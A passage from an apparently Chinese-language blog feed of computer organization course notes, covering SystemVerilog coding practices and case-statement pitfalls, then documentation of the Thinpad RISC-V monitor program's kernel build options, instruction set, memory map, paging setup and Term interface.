这可以防止在信号名字上出现的拼写错误. </p><h3 id="锁相环电路"><a href="#锁相环电路" class="headerlink" title="锁相环电路"></a>锁相环电路</h3><p>PLL 是 FPGA 上专用的时钟生成模块, 内部是模拟电路. PLL 在启动时需要一段时间才能进入稳定状态, <code>locked</code> 信号输出表示稳定. 在锁相环电路稳定输出之后, <code>locked</code> 信号会被置位, 此时可以进行电路寄存器初始化. </p><h3 id="调时序"><a href="#调时序" class="headerlink" title="调时序"></a>调时序</h3><p>硬件编程是仿真驱动的, 比较难的部分是调时序, 使各个部分的时序相互匹配, 同时满足对于外设的时间要求. 不同模块之间由于寄存器的关系有相位差, 需要增加几个空的状态机节拍, 匹配不同路径的信号传播. </p><h3 id="阻塞赋值语句和非阻塞赋值语句"><a href="#阻塞赋值语句和非阻塞赋值语句" class="headerlink" title="阻塞赋值语句和非阻塞赋值语句"></a>阻塞赋值语句和非阻塞赋值语句</h3><p>一般来说, 组合逻辑用 <code>=</code>, 时序逻辑用 <code>&lt;=</code>. <code>wire</code> 和 <code>reg</code> 是语法层面的内容, <code>assign</code> 的左值必须是 <code>wire</code>, <code>always</code> 里的左值必须是 <code>reg</code>, 否则综合会报错. 是否综合成触发器, 根据有没有时钟信号决定. 综合器通过 <code>posedge</code> 的描述方法知道对应的模块里面需要响应 <code>posedge</code> 或是 <code>negedge</code>, 从而综合出触发器. 尽量使用 <code>logic</code> 类型并匹配 <code>always_comb</code> 和 <code>always_ff</code> 来分别描述组合逻辑和时序逻辑.</p><h3 id="程序的可读性"><a href="#程序的可读性" class="headerlink" title="程序的可读性"></a>程序的可读性</h3><p>增加程序的可维护性, 在选择信号名称的时候需要按照名称选择的惯例, 有一些命名方法是常用的.</p><ul><li><code>_i</code>, <code>_o</code>, 分别代表一个模块的输入信号和输出信号. </li><li><code>n</code> 或者 <code>_n</code> 为后缀, 表明这个信号是 0 使能, 0 表示有效. </li><li><code>clk</code>, <code>clock</code> 时钟信号, 后面或者前面接上频率, 可以显示时钟信号的频率. </li><li><code>rst</code>, <code>reset</code> 复位信号, 使得信号可以重置, 一般在重置响应中写入状态机的初值. </li><li><code>we</code>, <code>write enable</code> 信号, 对应于模块的写入使能. </li><li><code>oe</code>, <code>output enable</code> 信号, 对应于模块的输出使能. </li><li><code>ce</code>, <code>chip enable</code>, 对应于模块的总体使能信号. 上述的信号几乎在所有的模块中都会有 (注意信号是正向的还是反向的, 即 1 使能还是 0 使能. 0 使能会在信号名称的上面带有横线).</li><li><code>select</code>, <code>sel</code> 信号, 一般用于对芯片的选择. </li></ul><h3 id="代码检查工具"><a href="#代码检查工具" class="headerlink" title="代码检查工具"></a>代码检查工具</h3><p><a href="https://www.veripool.org/">这个网址</a>中有一些 SystemVerilog 的工具可供参考. 使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">verilator --lint-only <span class="token parameter variable">-Wall</span> <span class="token punctuation">[</span>source_files.v<span class="token punctuation">]</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以帮助做一些检查. </p><h3 id="一些特殊的语法点"><a href="#一些特殊的语法点" class="headerlink" title="一些特殊的语法点"></a>一些特殊的语法点</h3><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog">ram_address <span class="token operator">=</span> pc<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">+</span><span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从第 2 位开始的 21 位, 把最后两位去掉. 也可以写成 <code>pc[22-:21]</code> 或 <code>pc[22:2]</code>. </p><h3 id="case-语句可能出现错误的情况"><a href="#case-语句可能出现错误的情况" class="headerlink" title="case 语句可能出现错误的情况:"></a>case 语句可能出现错误的情况:</h3><p>使用 <code>case</code> 的时候把所有信号在所有情况下写全, 或者灵活使用阻塞赋值语句 <code>=</code>, 在过程最前面的时候先进行赋值. </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token important">always_comb</span> <span class="token keyword">begin</span>    ram_we_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>    ram_oe_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>    ram_address <span class="token operator">=</span> <span class="token number">21'h0</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token punctuation">(</span>state<span class="token punctuation">)</span>        STATE_FETCH<span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> pc<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        STATE_MEM<span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> mem_op_write<span class="token punctuation">;</span>            ram_we_n <span class="token operator">=</span> <span class="token operator">~</span>mem_op_write<span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> ex_val_o<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">end</span>    <span class="token keyword">endcase</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面的 case 语句代码块也是正确的: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token important">always_comb</span> <span class="token keyword">begin</span>    <span class="token keyword">case</span> <span class="token punctuation">(</span>state<span class="token punctuation">)</span>        STATE_FETCH<span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>            ram_we_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> pc<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        STATE_MEM<span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> mem_op_write<span class="token punctuation">;</span>            ram_we_n <span class="token operator">=</span> <span class="token operator">~</span>mem_op_write<span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> ex_val_o<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">end</span>        <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>            ram_we_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> <span class="token number">21'h0</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>    <span class="token keyword">endcase</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是下面的 case 语句代码块是错误的.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token important">always_comb</span> <span class="token keyword">begin</span>    <span class="token keyword">case</span> <span class="token punctuation">(</span>state<span class="token punctuation">)</span>        STATE_FETCH<span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> pc<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        STATE_MEM<span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> mem_op_write<span class="token punctuation">;</span>            ram_we_n <span class="token operator">=</span> <span class="token operator">~</span>mem_op_write<span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> ex_val_o<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">end</span>        <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>            ram_we_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> <span class="token number">21'h0</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>    <span class="token keyword">endcase</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Warning-empty-statement-in-sequential-block"><a href="#Warning-empty-statement-in-sequential-block" class="headerlink" title="Warning: empty statement in sequential block"></a>Warning: empty statement in sequential block</h3><p>两个分号放在一起 <code>;;</code> 就会出现这个警告. 一个容易出现的错误是在信号常数定义 <code>`define</code> 的时候, 在信号后面跟了一个分号, 在模块代码里面直接使用的时候就会出现上面的情况. </p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Organization &amp; Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Organization &amp; Design </tag>
            
            <tag> SV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理 笔记2</title>
      <link href="/2023/09/23/ji-suan-ji-zu-cheng-yuan-li-bi-ji-2/"/>
      <url>/2023/09/23/ji-suan-ji-zu-cheng-yuan-li-bi-ji-2/</url>
      
        <content type="html"><![CDATA[<h1 id="RISC-V-监控程序"><a href="#RISC-V-监控程序" class="headerlink" title="RISC-V 监控程序"></a>RISC-V 监控程序</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>Thinpad</strong> 教学计算机搭配了监控程序, 能够接受用户命令, 支持输入汇编指令并运行, 查看寄存器及内存状态. 监控程序可在实现的 32/64 位 <strong>RISC-V</strong> CPU 上运行, 一方面帮助理解、掌握 RISC-V 指令系统及其软件开发, 另一方面作为验证 CPU 功能正确性的标准. </p><p>监控程序分为 <strong>Kernel</strong> 和 <strong>Term</strong> 两个部分. 其中 Kernel 使用 RISC-V 汇编语言编写, 运行在 Thinpad 上学生实现的 <strong>CPU</strong> 中, 用于<strong>管理硬件资源</strong>; Term 是上位机程序, 使用 Python 语言编写, 有基于命令行的用户界面, 达到与<strong>用户交互</strong>的目的. Kernel 和 Term 直接通过串口通信, 即用户在 Term 界面中输入的命令、代码经过 Term 处理后, 通过串口传输给 Kernel 程序; 反过来, Kernel 输出的信息也会通过串口传输到 Term 并展示给用户. </p><h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><p>Kernel 使用汇编语言编写, 使用到的指令有 20 余条, 均符合 RISC-V 规范. Kernel 提供了三种不同的版本, 以适应不同的档次的 CPU 实现: 第一档为<strong>基础版本</strong>, 直接基本的 I/O 和命令执行功能, 不依赖异常、中断、csr 等处理器特征, 适合于最简单的 CPU 实现; 第二档<strong>支持中断</strong>, 使用中断方式完成串口的 I/O 功能, 需要处理器实现中断处理机制, 及相关的 csr 寄存器; 第三档进一步增加了<strong>页表的应用</strong>, 要求处理器支持基于 Sv32 或者 Sv39 的内存映射, 更加接近于操作系统对处理器的需求. </p><p>为了在硬件上运行 Kernel 程序, 我们首先要对 Kernel 的汇编代码进行编译. 在 <code>kernel</code> 文件夹下面, 有汇编代码和 Makefile 文件, 我们可以使用 make 工具编译 Kernel 程序. 假设当前目录为 <code>kernel</code> , 目标版本为基础版本, 在终端中运行命令:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可开始编译流程. 如果顺利结束, 将生成 <code>kernel.elf</code> 和 <code>kernel.bin</code> 文件, 即可执行文件. 要在模拟器中运行它, 可以使用命令:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> sim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>它会在 <strong>QEMU</strong> 中启动监控程序, 并等待 Term 程序连接. 本文后续章节介绍了如何使用 Term 连接模拟器. 需要注意的是, 如果需要打开一些开关, 需要在每条命令中传递参数, 比如:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">EN_INT</span><span class="token operator">=</span>y sim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而不是</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">EN_INT</span><span class="token operator">=</span>y<span class="token function">make</span> sim<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>目前所有可能出现的开关有: </p><ol><li><code>EN_INT</code>: 打开中断、异常和用户态支持, 默认关闭. </li><li><code>EN_PAGING</code>: 打开页表支持, 要求 <code>EN_INT</code> 已打开, 默认关闭. </li><li><code>EN_FENCEI</code>: 如果实现了 L1 Cache 并且分离了 I Cache 和 D Cache 则应当开启, 在写入代码后执行 <code>FENCE.I</code> 指令, 默认关闭. </li><li><code>EN_UART16550</code>: 如果实现了 UART 16550 兼容的串口控制器则要开启, 否则可以关闭, 默认开启. </li></ol><p>若要在硬件上运行, 使用开发板提供的工具, 将 <code>kernel.bin</code> 写入内存 0x80000000 地址位置, 并让处理器复位从 0x80000000 地址处开始执行, Kernel 就运行起来了. </p><p>Kernel 运行后会先通过串口输出版本号, 该功能可作为检验其正常运行的标志. 之后 Kernel 将等待 Term 从串口发来的命令, 关于 Term 的使用将在后续章节描述.  </p><h3 id="基础版本"><a href="#基础版本" class="headerlink" title="基础版本"></a>基础版本</h3><p>基础版本的 Kernel 共使用了 19 条不同的指令, 它们是: </p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">ADD   0000000SSSSSsssss000ddddd0110011ADDI  iiiiiiiiiiiisssss000ddddd0010011AND   0000000SSSSSsssss111ddddd0110011ANDI  iiiiiiiiiiiisssss111ddddd0010011AUIPC iiiiiiiiiiiiiiiiiiiiddddd0010111BEQ   iiiiiiiSSSSSsssss000iiiii1100011BNE   iiiiiiiSSSSSsssss001iiiii1100011JAL   iiiiiiiiiiiiiiiiiiiiddddd1101111JALR  iiiiiiiiiiiisssss000ddddd1100111LB    iiiiiiiiiiiisssss000ddddd0000011LUI   iiiiiiiiiiiiiiiiiiiiddddd0110111LW    iiiiiiiiiiiisssss010ddddd0000011OR    0000000SSSSSsssss110ddddd0110011ORI   iiiiiiiiiiiisssss110ddddd0010011SB    iiiiiiiSSSSSsssss000iiiii0100011SLLI  0000000iiiiisssss001ddddd0010011SRLI  0000000iiiiisssss101ddddd0010011SW    iiiiiiiSSSSSsssss010iiiii0100011XOR   0000000SSSSSsssss100ddddd0110011<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果实现的是 RISC-V 64 位, 则额外需要实现以下指令: </p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">ADDIW iiiiiiiiiiiisssss000ddddd0011011LD    iiiiiiiiiiiisssss011ddddd0000011SD    iiiiiiiSSSSSsssss011iiiii0100011<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在以上指令里面, 很多指令的功能是相近的, 分类以后, 实际上只需要实现如下的几种指令, 然后很容易就可以扩展到其它指令:</p><pre class="line-numbers language-none"><code class="language-none">ADD: ADDI, AND, ANDI, OR, ORI, SLLI, SRLI, XOR, ADDIWAUIPC:BEQ: BNEJAL:JALR:LB: LW, LDLUI:SB: SW, SD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实际上只需要实现上面的八条指令, 简单扩展即可实现需要的所有指令. 根据 RISC-V 规范正确实现这些指令后, 程序才能正常工作. </p><p>监控程序使用了 8 MB 的内存空间, 其中约 1 MB 由 Kernel 使用, 剩下的空间留给用户程序. 此外, 为了支持串口通信, 还设置了一个内存以外的地址区域, 用于串口收发. 具体内存地址的分配方法如下表所示: </p><div class="table-container"><table><thead><tr><th>地址区间</th><th>说明</th></tr></thead><tbody><tr><td>0x80000000-0x800FFFFF</td><td>监控程序代码</td></tr><tr><td>0x80100000-0x803FFFFF</td><td>用户程序代码</td></tr><tr><td>0x80400000-0x807EFFFF</td><td>用户程序数据</td></tr><tr><td>0x807F0000-0x807FFFFF</td><td>监控程序数据</td></tr><tr><td>0x10000000-0x10000007</td><td>串口数据及状态</td></tr></tbody></table></div><p>串口控制器按照 <a href="https://www.lammertbies.nl/comm/info/serial-uart">16550 UART 的寄存器</a> 的子集实现, 访问的代码位于 <code>kern/utils.S</code> , 其部分数据格式为:</p><div class="table-container"><table><thead><tr><th>地址</th><th>位</th><th>说明</th></tr></thead><tbody><tr><td>0x10000000</td><td>[7:0]</td><td>串口数据, 读、写地址分别表示串口接收、发送一个字节</td></tr><tr><td>0x10000005</td><td>[5]</td><td>只读, 为 1 时表示串口空闲, 可发送数据</td></tr><tr><td>0x10000005</td><td>[0]</td><td>只读, 为 1 时表示串口收到数据</td></tr></tbody></table></div><p>默认情况下还会按照 UART 16550 的初始化流程进行一些寄存器的配置. 在 QEMU 中运行的时候, 请保持 <code>EN_UART16550=y</code> 默认行为. 如果采用自定义的实现, 请设置 <code>EN_UART16550=n</code> 以去掉这些寄存器操作, 或者忽略掉这些操作 (但初始化时仍会输出额外字符, 因为 RBR THR 和 DLL 在同一个地址). 如果使用了 AXI UART16550 作为串口控制器, 请参考代码注释并修改 <code>kernel/include/serial.h</code> 中的常量, 并设置 <code>EN_UART16550=y</code>. </p><p>Kernel 的入口地址为 0x80000000, 对应汇编代码 <code>kern/init.S</code> 中的 <code>START:</code> 标签. 在完成必要的初始化流程后, Kernel 输出版本信息, 随后进入 shell 线程, 与用户交互. shell 线程会等待串口输入, 执行输入的命令, 并通过串口返回结果, 如此往复运行. </p><p>当收到启动用户程序的命令后, 用户线程代替 shell 线程的活动. 用户程序的寄存器, 保存在从 0x807F0000 开始的连续 <code>31*XLEN</code> 字节中, 依次对应 x1 到 x31 用户寄存器, 每次启动用户程序时从上述地址装载寄存器值, 用户程序运行结束后保存到上述地址. </p><h3 id="进阶一-中断和异常支持"><a href="#进阶一-中断和异常支持" class="headerlink" title="进阶一: 中断和异常支持"></a>进阶一: 中断和异常支持</h3><p>作为扩展功能之一, Kernel 支持中断方式的 I/O, 和 Syscall 功能. 要启用这一功能, 编译时的命令变为: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">EN_INT</span><span class="token operator">=</span>y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这一编译选项, 会使得代码编译时增加宏定义 <code>ENABLE_INT</code> , 从而使能中断相关的代码. 为支持中断, CPU 要额外实现以下指令</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">CSRRC  ccccccccccccsssss011ddddd1110011CSRRS  ccccccccccccsssss010ddddd1110011CSRRW  ccccccccccccsssss001ddddd1110011EBREAK 00000000000100000000000001110011ECALL  00000000000000000000000001110011MRET   00110000001000000000000001110011SLTU   0000000SSSSSsssss011ddddd0110011<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此外还需要实现 CSR 寄存器的这些字段: </p><ol><li><code>mtvec</code>: BASE, MODE</li><li><code>mscratch</code></li><li><code>mepc</code></li><li><code>mcause</code>: Interrupt, Exception Code</li><li><code>mstatus</code>: MPP</li><li><code>mie</code>: MTIE</li><li><code>mip</code>: MTIP</li></ol><p>CSR 寄存器字段功能定义见 RISC-V 特权态规范. 监控程序对于异常、中断的使用方式如下: </p><ul><li>入口函数 <code>EXCEPTION_HANDLER</code>, 根据异常号跳转至相应的异常处理程序. </li><li>初始化时设置 <code>mtvec = EXCEPTION_HANDLER</code>, 使用正常中断模式 (<code>MODE = DIRECT</code>); 如果不支持 <code>MODE = DIRECT</code> (利用 <code>mtvec</code> 的 <code>WARL</code> 判断), 则会使用向量中断模式 (<code>MODE = VECTORED</code>). </li><li>用户程序在 U-mode 中运行 (<code>mret</code> 时 <code>mstatus.MPP = 0</code>), 通过 <code>ebreak</code> 回到 M-mode, 在异常处理中跳回到 SHELL. </li><li>异常帧保存 31 个通用寄存器及 <code>mepc</code> 寄存器. </li><li>禁止发生嵌套异常. </li><li>支持 <code>SYS_putc</code> 系统调用, 调用方法参考 <code>UTEST_PUTC</code> 函数. 写串口忙等待, 与禁止嵌套异常不冲突. </li><li>当发生不能处理的中断时, 表示出现严重错误, 终止当前任务, 自行重启. 并且发送错误信号 0x80 提醒 Term. </li></ul><p>为了支持时钟中断, 还需要实现 CLINT 设备的两个 MMIO 寄存器: </p><div class="table-container"><table><thead><tr><th>地址</th><th>说明</th></tr></thead><tbody><tr><td>0x200BFF8</td><td>mtime, 64 位, 可读写. 表示当前时间</td></tr><tr><td>0x2004000</td><td>mtimecmp, 64 位, 可读写. 表示下次时钟中断时间</td></tr></tbody></table></div><p>在 CLINT 设备的实现中, 需要每隔固定时间将 <code>mtime</code> 的值 +1, 并且当 <code>mtime &gt;= mtimecmp</code> 时拉高时钟中断信号, 然后 CPU 核心将 <code>mip.MTIP</code> 置 1. 当 <code>mip.MTIP</code>, <code>mie.MTIE</code> 同时为 1, 且当前特权态下全局中断启用时, CPU 即触发时钟中断. </p><p>具体参见 RISC-V 特权态手册 <em>3.1.10 Machine Timer Registers (mtime and mtimecmp)</em>. 有了时钟中断以后, Kernel 就可以杀掉运行超时的用户程序. </p><h3 id="进阶二-页表支持"><a href="#进阶二-页表支持" class="headerlink" title="进阶二: 页表支持"></a>进阶二: 页表支持</h3><p>在支持异常处理的基础上, 可以进一步使能页表支持, 从而实现用户态地址映射. 要启用这一功能, 编译时的命令变为: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">EN_INT</span><span class="token operator">=</span>y <span class="token assign-left variable">EN_PAGING</span><span class="token operator">=</span>y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>CPU 需要额外实现以下指令</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">SFENCE.VMA  0001001SSSSSsssss000000001110011<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果没有实现 TLB, 可把 <code>SFENCE.VMA</code> 实现为 NOP. 此外还需要实现 csr 寄存器: </p><ol><li><code>satp</code>: MODE, PPN</li></ol><p>以及页表相关的几个异常, RV32 需要实现 Sv32 的页表格式, RV64 需要实现 Sv39 的页表格式. 为了简化, 实际的映射是线性映射, Sv32 映射的方式在下面给出: </p><ul><li>`va[0x00000000, 0x002FFFFF] = pa[0x80100000, 0x803FFFFF] DAGUX-RV 用户态代码</li><li>va[0x7FC10000, 0x7FFFFFFF] = pa[0x80400000, 0x807EFFFF] DAGU-WRV 用户态数据</li><li>va[0x80000000, 0x80000FFF] = pa[0x80000000, 0x80000FFF] DAGUX-RV 用于返回内核态</li><li>va[0x80001000, 0x80001FFF] = pa[0x80001000, 0x80001FFF] DAGUX-RV 用于运行 UTEST 程序 (CRYPTONIGHT 除外)</li><li>va[0x80100000, 0x80100FFF] = pa[0x80100000, 0x80100FFF] DAGUX-RV 方便测试</li></ul><p>Sv39 下为了实现的方便, 映射的地址比以上的地址区域更大一些: </p><ul><li>va[0x00000000, 0x002FFFFF] = pa[0x80100000, 0x803FFFFF] DAGUX-RV 用户态代码</li><li>va[0x7FC10000, 0x7FFFFFFF] = pa[0x80400000, 0x807EFFFF] DAGU-WRV 用户态数据</li><li>va[0x80000000, 0x801FFFFF] = pa[0x80000000, 0x801FFFFF] DAGUX-RV 用于返回内核态、运行 UTEST 程序和方便测试</li></ul><p>其它地址都未经映射, 访问则会引发异常. </p><p>初始化过程: </p><ol><li>根据 RV32 还是 RV64 选择 Sv32 或者 Sv39 的页表进行填写</li><li>将页表的物理地址写入 <code>satp</code> 并配置好模式, 启用 U-mode 下的页表映射机制. </li><li>通过 <code>sfence.vma</code> 指令刷新 TLB. </li><li>将用户栈指针设为 0x80000000. </li></ol><h2 id="Term"><a href="#Term" class="headerlink" title="Term"></a>Term</h2><p>Term 程序运行在实验者电脑上, 提供监控程序交互界面. Term 支持以下命令: </p><ul><li><code>R</code>: 按照 x1 至 x31 的顺序返回用户程序寄存器值. </li><li><code>D</code>: 显示从指定地址开始的一段内存区域中的数据. </li><li><code>A</code>: 用户输入汇编指令, 并放置到指定地址上. </li><li><code>F</code>: 从文件读入汇编指令并放置到指定地址上, 格式与 A 命令相同. </li><li><code>U</code>: 从指定地址读取一定长度的数据, 并显示反汇编结果. </li><li><code>G</code>: 执行指定地址的用户程序. </li><li><code>T</code>: 查看页表内容, 仅在启用页表时有效. </li><li><code>Q</code>: 退出 Term. </li></ul><p>利用这些命令, 实验者可以输入一段汇编程序, 检查数据是否正确写入, 并让程序在处理器上运行验证. Term 程序位于 <code>term</code> 文件夹中, 可执行文件为 <code>term.py</code> . 对于本地的 Thinpad, 运行程序时用 <code>-s</code> 选项指定串口. 例如: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python term.py <span class="token parameter variable">-s</span> COM3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python term.py <span class="token parameter variable">-s</span> /dev/ttyACM0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接远程实验平台 Thinpad 或 QEMU 模拟器时, 使用 -t 选项指定 IP 和端口. 如: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python term.py <span class="token parameter variable">-t</span> <span class="token number">127.0</span>.0.1:6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h3><p>监控程序附带了几个测试程序, 代码见 <code>kern/test.S</code> . 可以通过命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">EN_XXX</span><span class="token operator">=</span>y show-utest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来查看测试程序入口地址. 记下这些地址, 并在 Term 中使用 <code>G</code> 命令运行它们. </p><ul><li><p><code>CRYPTONIGHT</code> 测试模仿了 CryptoNight 算法, 它会进行很多次的随机访存, 数据缓存命中率会很低. 运行结束后, 寄存器 <code>t0</code> 保存的是最终结果, 32 位下应该是 <code>a2e31a85</code>, 64 位下应该是 <code>ffffffff861c65d4</code>. </p></li><li><p><code>SPIN</code> 测试是一个死循环, 用来测试时钟中断能否正确杀掉超时程序. </p></li></ul><h3 id="用户程序编写"><a href="#用户程序编写" class="headerlink" title="用户程序编写"></a>用户程序编写</h3><p>根据监控程序设计, 用户程序的代码区为 0x80100000-0x803FFFFF, 实验时需要把用户程序写入这一区域. 用户程序的最后需要以 <code>jr ra</code> 结束, 保证正确返回监控程序. </p><p>在输入用户程序的过程中, 可以用汇编指令, 可以直接写 16 进制的机器码, 还可以写 label (见以下例子中 <code>loop:</code>). 以下是一次输入用户程序并运行的过程演示: </p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">connecting to 127.0.0.1:6666...connectedrunning in 32bit, xlen = 4&gt;&gt; aaddr: 0x80100000one instruction per line, empty line to end.[0x80100000] li a0, 5[0x80100004] li t0, 0[0x80100008] 00000313[0x8010000c] loop:[0x8010000c] add t1, t1, t0[0x80100010] addi t0, t0, 1[0x80100014] bne a0, t0, loop[0x80100018] jr ra[0x8010001c]&gt;&gt; uaddr: 0x80100000num: 320x80100000:00500513lia0,50x80100004: 00000293lit0,00x80100008: 00000313lit1,00x8010000c: 00530333addt1,t1,t00x80100010: 00128293addit0,t0,10x80100014: fe551ce3bnea0,t0,0x8010000c0x80100018: 00008067ret0x8010001c: 00000000...&gt;&gt; gaddr: 0x80100000elapsed time: 0.000s&gt;&gt; rR1 (ra)    = 0x80000414R2 (sp)    = 0x807fff00R3 (gp)    = 0x00000000R4 (tp)    = 0x00000000R5 (t0)    = 0x00000005R6 (t1)    = 0x0000000aR7 (t2)    = 0x00000000R8 (s0/fp) = 0x80000000R9 (s1)    = 0x00000000R10(a0)    = 0x00000005R11(a1)    = 0x00000000R12(a2)    = 0x00000000R13(a3)    = 0x00000000R14(a4)    = 0x00000000R15(a5)    = 0x00000000R16(a6)    = 0x00000000R17(a7)    = 0x00000000R18(s2)    = 0x00000000R19(s3)    = 0x00000000R20(s4)    = 0x00000000R21(s5)    = 0x00000000R22(s6)    = 0x00000000R23(s7)    = 0x00000000R24(s8)    = 0x00000000R25(s9)    = 0x00000000R26(s10)   = 0x80100000R27(s11)   = 0x00000000R28(t3)    = 0x00000000R29(t4)    = 0x00000000R30(t5)    = 0x00000000R31(t6)    = 0x00000000&gt;&gt; q<span aria-hidden="true" 